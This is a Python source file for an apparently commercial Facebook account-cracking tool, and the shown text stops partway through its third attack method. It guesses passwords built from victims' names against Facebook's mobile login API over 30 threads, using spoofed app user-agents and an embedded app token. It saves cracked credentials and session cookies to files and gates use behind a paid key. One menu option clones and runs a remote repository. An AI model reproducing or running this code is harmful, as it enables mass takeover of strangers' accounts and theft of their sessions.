#originally written by hamayun❤️

import os,requests,json,time,re,random,sys,uuid,string,subprocess,base64
from string import *
import bs4
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as bola
ok,cp,tf,id,idx,user,pp,ugen,ugen2,ok,cp,tf,num,loop = [],[],[],[],[],[],[],[],[],[],[],[],0,0
lines,fav,idd=[],[],[]
oks,cps,tfs=[],[],[]
from os import system as psl
from uuid import uuid4
headers = {
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "origin":"https://m.facebook.com",
        "referer":"https://m.facebook.com",
        "sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
        "upgrade-insecure-requests":"1",
        "user-agent":"Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"
}

m1 = ("""
[FBAN/FB4A;FBAV/371.0.0.24.109;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/371.0.0.24.109;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y11;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/372.1.0.23.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/372.1.0.23.107;FBCR/infinix;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca.lite;FBDV/vivo Y12;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/106.0.0.26.68;FBCR/motorola;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y19;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/284.0.0.50.107;FBCR/htc;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y19;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/373.0.0.31.112;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/373.0.0.31.112;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo Y20;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/TECNO;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y11;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/264.0.0.44.111;FBCR/Vodafone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca.lite;FBDV/vivo Y66;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/motorola;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.adsmanager;FBDV/vivo Y95;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/284.0.0.50.107;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca.lite;FBDV/vivo Y31;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/349.0.0.39.470;FBCR/htc;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y53;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/106.0.0.26.68;FBCR/motorola;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo Y93;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
""").splitlines()
a=random.choice(m1)


m2 = ("""
[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/264.0.0.44.111;FBCR/TECNO;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y15;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/samsung;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y11;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/TECNO;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y95;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/264.0.0.44.111;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y11;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/373.0.0.31.112;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/373.0.0.31.112;FBCR/TECNO;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo Y95;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/Vodafone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y11;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/374.0.0.20.109;FBCR/Vodafone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y95;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/372.1.0.23.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/372.1.0.23.107;FBCR/TECNO;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y55;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/106.0.0.26.68;FBCR/TECNO;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.adsmanager;FBDV/vivo Y31;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/372.1.0.23.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/372.1.0.23.107;FBCR/samsung;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y55;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/284.0.0.50.107;FBCR/motorola;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y95;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
""").splitlines()
b=random.choice(m2)

m3 = ("""
[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/106.0.0.26.68;FBCR/motorola;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y93;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/htc;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca.lite;FBDV/vivo Y12;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/332.0.0.23.111;FBCR/motorola;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y12;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/284.0.0.50.107;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo Y51;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/284.0.0.50.107;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y97;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/284.0.0.50.107;FBCR/samsung;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.adsmanager;FBDV/vivo Y15;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/371.0.0.24.109;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/371.0.0.24.109;FBCR/motorola;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca.lite;FBDV/vivo Y93;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/374.0.0.20.109;FBCR/htc;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y17;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/106.0.0.26.68;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca.lite;FBDV/vivo Y31;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/298.0.0.46.116;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y66;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/284.0.0.50.107;FBCR/samsung;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo Y15;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/373.0.0.31.112;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/373.0.0.31.112;FBCR/samsung;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y19;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
[FBAN/FB4A;FBAV/373.0.0.31.112;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/373.0.0.31.112;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y55;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
""").splitlines()
c=random.choice(m3)

os.system("clear")
logo = """
  __ __   ____  ___ ___   ____  __ __  __ __  ____  
 |  T  T /    T|   T   T /    T|  T  T|  T  T|    \ 
 |  l  |Y  o  || _   _ |Y  o  ||  |  ||  |  ||  _  Y
 |  _  ||     ||  \_/  ||     ||  ~  ||  |  ||  |  |
 |  |  ||  _  ||   |   ||  _  |l___, ||  :  ||  |  |
 |  |  ||  |  ||   |   ||  |  ||     !l     ||  |  |
 l__j__jl__j__jl___j___jl__j__jl____/  \__,_jl__j__j
                                                    
     ┌────────────────────────────────────────┐
     └────────────────────────────────────────┘
\033[1;92mUSE FLIGHT MODE FOR 20 SECOND AFTER EACH 5 MINUTES OF CRACKING 

\033[0;92m---------------------------------------------\033[0;m"""

def approval():
	print(logo)
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "-".join(uuid)
	print("\033[1;92mYour key : "+id)
	print("")
	server=requests.get("https://github.com/osainmegnt/s/blob/main/a").text
	print("\033[1;91mchecking approval")
	print("")
	time.sleep(2)
	if id in server:
		print("\033[1;92mYour Key Found in Server")
		time.sleep(3)
		os.system("clear")
		mm()
	else:
		print("\033[1;93mYou Need To Buy This Tool The You Can Use")
		print("")
		print("\033[1;94mApproval Price Is 20$ Each Month")
		print("")
		print("\033[1;96mIf You Want To Buy The Tool Contact Me On Telegram")
		print("")
		os.system("xdg-open https://t.me/micron588")
		time.sleep(3)
		exit()
		

def mm():
    print(logo)
    print('\033[1;91m [1] File Clone ')
    print('\033[1;92m [2] File Making')
    print('')
    ra = input(' Put Option >> ')
    if '1' in ra:
        f_clone()
    elif '2' in ra:
        os.system("git clone https://github.com/Hannan-404/File && cd FILE && python FILE.py")
    else:
        f_clone()
        

def f_clone():
    #chck()
    psl('clear')
    print(logo)
    print("              File Crack Menu")
    print(' -------------------------------------------')
    try:
        file = input(" [] File : ")
        cnt=open(file).read().splitlines()
        for x in open(file,'r').readlines():
            idd.append(x.strip())
        methods()
    except:
        print('  \n        File Not Found ');time.sleep(1)
        f_clone()
        
        
def methods():
    os.system("clear")
    print(logo)
    print("\033[1;92m  NOTE: ALL METHODS UPDATED,TRY 1 BY 1")
    print("")
    print('\033[1;97m [1] Method 1 ')
    print('\033[1;98m [2] Method 2 ')
    print('\033[1;99m [3] Method 3 ')
    print("")
    method=input("  Select <> ")
    if method=="1":
        pass_word()
    elif method=="2":
        pass_word2()
    elif method=="3":
    	pass_word3()    		
    else:
    	print("  Select Method")
    	time.sleep(2)
    methods()


       
def pass_word():
    #chck()
    psl('clear')
    print(logo)
    sm = '1'
    lp = input('\033[1;98m [+] How many passwords you want to add? ')
    print('\n')
    if lp.isnumeric():
        psl('clear')
        print(logo)
        print(' \n Put {} Passwords '.format(lp))
        print(' Example: firstlast,first last,First123 etc')
        print(' -------------------------------------------')
        for x in range(int(lp)):
            pp.append(input(f' Password {x+1} : '))
        pass
    else:
        print('  \n        Put Valid One  ');time.sleep(1)
        pass_word()
    with bola(max_workers=30) as crack:
        psl("clear")
        print(logo)
        psl('clear')
        print(logo)
        print(' \033[1;97m[+] Total IDs : %s' %(len(idd)))
        print(' \033[1;97mYour Process Started in Background')
        print('-------------------------------------------')
        total_ids = str(len(idd))
        for user in idd:
            ids,names = user.split('|')
            p_list = pp
            if sm == '1':
                crack.submit(method_1,ids,names,p_list)
            elif sm == '2':
                crack.submit(method_1,ids,names,p_list)
            else:
                crack.submit(method_1,ids,names,p_list)
        os.sys.exit()
def pass_word2():
    #chck()
    psl('clear')
    print(logo)
    sm = '1'
    lp = input('\033[1;98m [+] How many passwords you want to add? ')
    print('\n')
    if lp.isnumeric():
        psl('clear')
        print(logo)
        print(' \n Put {} Passwords '.format(lp))
        print(' Example: firstlast,first last,First123 etc')
        print(' -------------------------------------------')
        for x in range(int(lp)):
            pp.append(input(f' Password {x+1} : '))
        pass
    else:
        print('  \n        Put Valid One  ');time.sleep(1)
        pass_word()
    with bola(max_workers=30) as crack:
        psl("clear")
        print(logo)
        psl('clear')
        print(logo)
        print(' \033[1;97m[+] Total IDs : %s' %(len(idd)))
        print(' \033[1;97mYour Process Started in Background')
        print('-------------------------------------------')
        total_ids = str(len(idd))
        for user in idd:
            ids,names = user.split('|')
            p_list = pp
            if sm == '1':
                crack.submit(method_2,ids,names,p_list)
            elif sm == '2':
                crack.submit(method_2,ids,names,p_list)
            else:
                crack.submit(method_2,ids,names,p_list)
        os.sys.exit()

def pass_word3():
    #chck()
    psl('clear')
    print(logo)
    sm = '1'
    lp = input('\033[1;98m [+] How many passwords you want to add? ')
    print('\n')
    if lp.isnumeric():
        psl('clear')
        print(logo)
        print(' \n Put {} Passwords '.format(lp))
        print(' Example: firstlast,first last,First123 etc')
        print(' -------------------------------------------')
        for x in range(int(lp)):
            pp.append(input(f' Password {x+1} : '))
        pass
    else:
        print('  \n        Put Valid One  ');time.sleep(1)
        pass_word()
    with bola(max_workers=30) as crack:
        psl("clear")
        print(logo)
        psl('clear')
        print(logo)
        print(' \033[1;97m[+] Total IDs : %s' %(len(idd)))
        print(' \033[1;97mYour Process Started in Background')
        print('-------------------------------------------')
        total_ids = str(len(idd))
        for user in idd:
            ids,names = user.split('|')
            p_list = pp
            if sm == '1':
                crack.submit(method_3,ids,names,p_list)
            elif sm == '2':
                crack.submit(method_3,ids,names,p_list)
            else:
                crack.submit(method_3,ids,names,p_list)
        os.sys.exit()

def method_1(ids,names,p_list):
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        for pas in p_list:
            global loop, oks, cps, tfs, ruz
           # ses=requests.Session()
            sys.stdout.write('\r\r\033[1;37m [ HAM ] %s <> \033[1;37mOK:%s \033[1;37m Method 1 '%(loop,len(oks)));sys.stdout.flush()
            try:
                pas = pas.replace("first", first.lower()).replace("last", last.lower()).replace("First", first).replace("Last", last)
            except:
                pas = pas
            #ua = random.choice([None,generate_ugent()]) #"Mozilla/3.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/3nMNa [FBAN/FBIOS;FBDV/iPhone11,1;FBMD/iPhone;FBSN/iOS;FBSV/86.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]"
            ses=requests.Session()
            data = {'email':ids,'password':pas,'cpl':'true','credentials_type':'password','error_detail_type':'button_with_disabled','source':'login','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',}
            head = {'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger','user-agent':a}
            url = 'https://b-api.facebook.com/method/auth.login'
            post = requests.post(url,data=data,headers=head,allow_redirects=False)
            q = json.loads(post.text)
            if 'c_user' in q:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                 #   chnge(cokeii,pas,n_pas)
                    break
            elif "session_key" in post.text:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif "session_key" in q:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif "EAAA" in post.text:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif 'checkpoint' in post.text:
                    print('\r\r\033[1;33m [CP-HAM] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/HAM-cp.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(e)
        

def method_2(ids,names,p_list):
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        for pas in p_list:
            global loop, oks, cps, tfs, ruz
           # ses=requests.Session()
            sys.stdout.write('\r\r\033[1;37m [ HAM ] %s <> \033[1;37mOK:%s \033[1;37m Method 2 '%(loop,len(oks)));sys.stdout.flush()
            try:
                pas = pas.replace("first", first.lower()).replace("last", last.lower()).replace("First", first).replace("Last", last)
            except:
                pas = pas
            #ua = random.choice([None,generate_ugent()]) #"Mozilla/3.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/3nMNa [FBAN/FBIOS;FBDV/iPhone11,1;FBMD/iPhone;FBSN/iOS;FBSV/86.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]"
            ses=requests.Session()
            data = {'email':ids,'password':pas,'cpl':'true','credentials_type':'password','error_detail_type':'button_with_disabled','source':'login','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',}
            head = {'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger','user-agent':b}
            url = 'https://b-api.facebook.com/method/auth.login'
            post = requests.post(url,data=data,headers=head,allow_redirects=False)
            q = json.loads(post.text)
            if 'c_user' in q:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                 #   chnge(cokeii,pas,n_pas)
                    break
            elif "session_key" in post.text:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif "session_key" in q:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif "EAAA" in post.text:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif 'checkpoint' in post.text:
                    print('\r\r\033[1;33m [CP-HAM] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/HAM-cp.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(e)
def method_3(ids,names,p_list):
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        for pas in p_list:
            global loop, oks, cps, tfs, ruz
           # ses=requests.Session()
            sys.stdout.write('\r\r\033[1;37m [ HAM ] %s <> \033[1;37mOK:%s \033[1;37m Method 3 '%(loop,len(oks)));sys.stdout.flush()
            try:
                pas = pas.replace("first", first.lower()).replace("last", last.lower()).replace("First", first).replace("Last", last)
            except:
                pas = pas
            #ua = random.choice([None,generate_ugent()]) #"Mozilla/3.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/3nMNa [FBAN/FBIOS;FBDV/iPhone11,1;FBMD/iPhone;FBSN/iOS;FBSV/86.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]"
            ses=requests.Session()
            data = {'email':ids,'password':pas,'cpl':'true','credentials_type':'password','error_detail_type':'button_with_disabled','source':'login','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',}
            head = {'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger','user-agent':c}
            url = 'https://b-api.facebook.com/method/auth.login'
            post = requests.post(url,data=data,headers=head,allow_redirects=False)
            q = json.loads(post.text)
            if 'c_user' in q:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
